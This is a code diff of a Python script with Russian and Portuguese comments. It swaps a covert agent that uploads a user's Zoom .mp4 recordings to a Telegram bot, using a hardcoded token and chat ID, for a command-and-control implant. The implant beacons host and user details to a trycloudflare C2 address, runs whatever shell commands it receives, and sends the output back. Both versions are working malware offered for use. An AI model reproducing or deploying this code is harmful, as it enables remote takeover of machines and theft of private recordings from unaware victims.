@@ -1,101 +1,113 @@
-import os
-import re
-import time
-import json
 import requests
-from datetime import datetime
-from platformdirs import user_documents_path
+import time
+import subprocess
+import json
+import os
+import base64 # +++ ADICIONADO
 
-LOG_PATH = "sent_log.json"
+# --- CONFIGURAÇÃO ---
+C2_URL = "https://arbitrary-summaries-shoulder-wu.trycloudflare.com"
+AGENT_ID_FILE = "agent_id.dat"
+PROFILE_FILE = "profile.json" # +++ ADICIONADO
+AGENT_ID = None
 
-# Автоматическое определение пути к папке Zoom
-ZOOM_PATH = os.path.join(user_documents_path(), "Zoom")
+# +++ ADICIONADO: Carregar o perfil
+try:
+    with open(PROFILE_FILE, 'r') as f:
+        profile = json.load(f)
+except FileNotFoundError:
+    print(f"[-] Erro: Arquivo de perfil '{PROFILE_FILE}' não encontrado.")
+    exit()
 
-CHAT_ID = "-4897594542"
-BOT_TOKEN = "8126291058:AAGGddCgMjqGtpGvhZUgdKLwaDXFqJV3NkY"
+# (Funções de get/set ID permanecem iguais)
+def get_agent_id():
+    # ... (sem alterações)
+    if os.path.exists(AGENT_ID_FILE):
+        with open(AGENT_ID_FILE, 'r') as f:
+            return f.read().strip()
+    return None
 
-# Загружаем лог отправленных файлов
-if os.path.exists(LOG_PATH):
-    with open(LOG_PATH, "r", encoding="utf-8") as f:
-        sent_log = set(json.load(f))
-else:
-    sent_log = set()
+def set_agent_id(new_id):
+    # ... (sem alterações)
+    with open(AGENT_ID_FILE, 'w') as f:
+        f.write(new_id)
 
-def send_video(file_path, caption):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
-    with open(file_path, "rb") as video:
-        files = {"video": video}
-        data = {
-            "chat_id": CHAT_ID,
-            "caption": caption,
-            "supports_streaming": True
-        }
-        response = requests.post(url, files=files, data=data)
-        if response.ok:
-            print(f"✅ Отправлено: {os.path.basename(file_path)}")
-        else:
-            print(f"❌ Ошибка при отправке {os.path.basename(file_path)}: {response.text}")
-        return response.ok
+AGENT_ID = get_agent_id()
 
-def extract_user_and_datetime_from_path(path):
-    folder = os.path.basename(os.path.dirname(path))
+def send_beacon():
+    """Envia o beacon para o C2 de acordo com o perfil de comunicação."""
+    global AGENT_ID
+    
+    system_info = {
+        "hostname": os.environ.get('COMPUTERNAME', 'Unknown'),
+        "user": os.environ.get('USERNAME', 'Unknown'),
+        "agent_id": AGENT_ID
+    }
+    
+    # +++ MODIFICADO: A lógica de comunicação agora usa o perfil
+    beacon_cfg = profile['beacon_config']
+    headers = {'User-Agent': profile['user_agent']}
+    beacon_url = f"{C2_URL}{beacon_cfg['uri']}"
 
-    # Паттерн для поиска даты и времени (форматы с точками или двоеточиями в времени)
-    dt_pattern = re.compile(r'(\d{4}[-/]\d{2}[-/]\d{2})[ ](\d{2}[.:]\d{2}[.:]\d{2})')
-    match = dt_pattern.search(folder)
-
-    if not match:
-        print(f"⚠️ Не найден формат даты и времени в '{folder}'")
-        return "Неизвестный пользователь", "Неизвестная дата"
-
-    date_str = match.group(1).replace('/', '-')
-    time_str = match.group(2).replace('.', ':')
     try:
-        dt = datetime.strptime(f"{date_str} {time_str}", "%Y-%m-%d %H:%M:%S")
-        date_formatted = dt.strftime("%d.%m.%Y %H:%M")
-    except Exception:
-        date_formatted = "Неизвестная дата"
+        if beacon_cfg['method'] == 'GET':
+            # Codifica os dados em base64 para colocar na URL
+            encoded_info = base64.b64encode(json.dumps(system_info).encode()).decode()
+            params = {beacon_cfg['data_param']: encoded_info}
+            response = requests.get(beacon_url, headers=headers, params=params, timeout=10)
+        else: # POST
+            response = requests.post(beacon_url, headers=headers, json=system_info, timeout=10)
+        
+        if response.status_code == 200:
+            data = response.json()
+            if AGENT_ID is None and 'agent_id' in data:
+                AGENT_ID = data['agent_id']
+                set_agent_id(AGENT_ID)
+                print(f"[+] Registrado com sucesso. Meu ID é: {AGENT_ID}")
+            
+            if 'task' in data and data['task'] != 'none':
+                execute_task(data['task'])
 
-    # Всё, что идёт после даты и времени
-    after_dt = folder[match.end():].strip()
+    except requests.exceptions.RequestException as e:
+        print(f"[-] Erro de comunicação com o C2: {e}")
 
-    # Возможные варианты:
-    # 1) "name's Zoom Meeting"
-    # 2) "Zoom Meeting name"
-    # Нужно убрать "Zoom Meeting" (в любом регистре и порядке) и "'s"
+def send_results(task_id, output):
+    """Envia o resultado de uma tarefa para o C2 de acordo com o perfil."""
+    # +++ MODIFICADO: A lógica de comunicação agora usa o perfil
+    results_cfg = profile['results_config']
+    headers = {'User-Agent': profile['user_agent']}
+    
+    # Monta a URL dinâmica com o agent_id
+    uri = results_cfg['uri'].replace('.json', f'/{AGENT_ID}.json')
+    results_url = f"{C2_URL}{uri}"
+    
+    payload = {"task_id": task_id, "output": output}
+    try:
+        requests.post(results_url, headers=headers, json=payload, timeout=10)
+        print(f"[+] Resultado da tarefa {task_id} enviado.")
+    except requests.exceptions.RequestException as e:
+        print(f"[-] Erro ao enviar resultado: {e}")
 
-    # Убираем "'s"
-    after_dt = after_dt.replace("'s", "").strip()
+# (funções execute_task e main_loop permanecem iguais)
+def execute_task(task):
+    # ... (sem alterações)
+    task_id = task.get('task_id')
+    command = task.get('command')
+    print(f"[*] Recebi a tarefa {task_id}: Executar '{command}'")
+    output = ""
+    try:
+        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
+        output = result.stdout + result.stderr
+    except Exception as e:
+        output = f"Erro ao executar o comando: {e}"
+    send_results(task_id, output)
 
-    # Ищем и удаляем "Zoom Meeting" (может быть в начале или в конце)
-    zoom_meeting_pattern = re.compile(r'zoom meeting', re.IGNORECASE)
-    parts = zoom_meeting_pattern.split(after_dt)
-
-    # После разделения parts — остаются либо [имя], либо ['', имя]
-    # Возьмём все части, соединяем и обрезаем пробелы
-    user_name = " ".join(part.strip() for part in parts if part.strip())
-
-    if not user_name:
-        user_name = "Неизвестный пользователь"
-
-    return user_name, date_formatted
-
-def scan_and_send():
-    for root, _, files in os.walk(ZOOM_PATH):
-        for name in files:
-            if name.endswith(".mp4"):
-                full_path = os.path.join(root, name)
-                if full_path not in sent_log:
-                    user_name, date = extract_user_and_datetime_from_path(full_path)
-                    caption = f"🎥 {user_name} · {date} · {name}"
-                    print(f"📤 Отправка: {caption}")
-                    if send_video(full_path, caption):
-                        sent_log.add(full_path)
-                        with open(LOG_PATH, "w", encoding="utf-8") as f:
-                            json.dump(list(sent_log), f)
+def main_loop():
+    # ... (sem alterações)
+    sleep_interval = 30
+    while True:
+        send_beacon()
+        time.sleep(sleep_interval)
 
 if __name__ == "__main__":
-    print(f"📡 Агент запущен. Следит за: {ZOOM_PATH}")
-    while True:
-        scan_and_send()
-        time.sleep(30)
+    main_loop()
